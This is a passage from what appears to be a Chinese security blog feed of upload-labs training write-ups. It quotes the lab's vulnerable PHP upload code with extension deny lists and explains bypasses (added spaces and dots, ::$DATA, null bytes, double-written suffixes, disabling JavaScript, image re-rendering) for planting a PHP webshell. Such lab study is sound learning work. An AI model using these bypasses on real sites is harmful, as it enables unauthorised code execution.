class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>    <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>我们发现没有去空，所以我们可以尝试多加空格</p></blockquote><blockquote><p>​<code>$file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</code>​   我们上传的有空格的后缀，会直接提交上去，所以后面的后缀是php      这样</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>加空格绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次渲染绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-comment">//会去获得浏览器中的content-type</span><br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// 获得上传文件的扩展名</span><br>    <span class="hljs-variable">$fileext</span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$target_path</span>);<span class="hljs-comment">//使用上传的图片生成新的图片,文件的重写，二次渲染</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;         <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>经过二次渲染以后的图片马，将不会保留一句话木马，只保留图片的原始信息</p></blockquote><p>所以要绕过，我们就去找二次渲染后的图片，然后比较和之前的图片相同的地方，然后因为那里面是不会被二次渲染的，我们在那里插入我们的一句话木马</p><blockquote><p>但是推荐用gif，因为gif的二次渲染的相匹配的更多</p></blockquote><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote><p>php二次渲染不会重复多次渲染，我们可以检测二次渲染过后的再上传再看，然后再在二次渲染的图片中插入一句话木马，有可能不会被二次渲染掉</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二次渲染绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h1><p>没抓到包，说明还没发到后端，在前端就被拦截下来了</p><h1 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h1><h2 id="1-由于找到是前端且js，所以我们直接禁用js"><a href="#1-由于找到是前端且js，所以我们直接禁用js" class="headerlink" title="1.由于找到是前端且js，所以我们直接禁用js"></a>1.由于找到是前端且js，所以我们直接禁用js</h2><h2 id="2-我们可以把绕过函数那个检测删除掉"><a href="#2-我们可以把绕过函数那个检测删除掉" class="headerlink" title="2.我们可以把绕过函数那个检测删除掉"></a>2.我们可以把绕过函数那个检测删除掉</h2><p><img src="/.com//image-20250114181752-uow71t3.png" alt="image"></p><p>删除掉以后，我们可以直接上传php一句话木马</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>后缀绕过总结</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="后缀绕过总结"><a href="#后缀绕过总结" class="headerlink" title="后缀绕过总结"></a>后缀绕过总结</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<span class="hljs-comment">//获得最后一个点后面所有的字符</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <span class="hljs-comment">//移动的时候会按照服务器来消除一些后缀</span><br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>因为是先判断在上传服务器，所以不是条件竞争，就只是一个后缀绕过，当然这个没有禁用.user.ini，不过还可以用‘.’和空格来绕过\也可以</p><p>因为是post也可以尝试一下0x00.jpg</p><p>还可以尝试::$DATA</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>后缀绕过总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>双写后缀绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="双写后缀绕过"><a href="#双写后缀绕过" class="headerlink" title="双写后缀绕过"></a>双写后缀绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;    <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这一题不一样，主要是<kbd>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</kbd>​这一句，它会把查到黑名单的后缀直接替换为空防止你提交,这个是从左到右执行一次的</p></blockquote><p><img src="/.com//image-20250120183041-e0h7z3q.png" alt="image"></p><blockquote><p> 将文件名中间多加一个php，那这样替换为空的将会是中间那个php，然后后面组成的还是一个php文件</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>双写后缀绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>多加点绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%A4%9A%E5%8A%A0%E7%82%B9%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%A4%9A%E5%8A%A0%E7%82%B9%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="多加点绕过"><a href="#多加点绕过" class="headerlink" title="多加点绕过"></a>多加点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span 